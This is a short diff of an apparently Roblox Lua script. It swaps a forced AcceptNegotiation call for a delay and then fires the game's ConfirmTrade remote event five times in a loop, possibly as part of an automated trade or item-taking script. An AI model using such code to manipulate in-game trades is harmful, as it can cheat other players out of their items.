@@ -75,11 +75,9 @@ local function addItem(id)
 	wait(0.1)
 end
 
--- ✅ Force confirm
+-- ✅ Confirm only (no force accept)
 local function acceptAndConfirm()
-	ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
-	print("[✓] Forced accept")
-
+	wait(5.5)
 	for i = 1, 5 do
 		wait(0.5)
 		ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer()
